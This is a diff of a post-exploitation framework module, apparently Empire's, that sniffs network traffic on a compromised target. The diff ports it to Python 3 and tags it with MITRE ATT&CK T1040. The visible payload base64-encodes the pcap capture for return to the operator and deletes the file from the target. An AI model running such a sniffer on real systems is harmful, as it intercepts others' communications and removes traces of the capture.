@@ -1,4 +1,8 @@
-class Module:
+from builtins import object
+from builtins import str
+
+
+class Module(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -12,6 +16,10 @@ class Module:
 
             # more verbose multi-line description of the module
             'Description': 'This module will sniff all interfaces on the target, and write in pcap format.',
+
+            'Software': '',
+
+            'Techniques': ['T1040'],
 
             # True if the module needs to run in the background
             'Background': False,
@@ -258,15 +266,15 @@ def socketSniffer(fileName,ipFilter,portFilter,maxSize, maxPackets, inMemory):
             packetCounter += 1
   try:
     if inMemory:
-        print memoryPcap
+        print(memoryPcap)
     else:
         f = open('%s', 'rb')
         data = base64.b64encode(f.read())
         f.close()
         run_command('rm -f %s')
-        print data
+        print(data)
   except Exception as e:
-    print e
+    print(e)
 
 fileNameSave = '%s'
 ipFilter = %s
@@ -278,3 +286,4 @@ socketSniffer(fileNameSave,ipFilter,portFilter,maxSize,maxPackets, inMemory)
         """ % (savePath, savePath, savePath, ipFilter, portFilter, maxSize, maxPackets, inMemory)
 
         return script
+
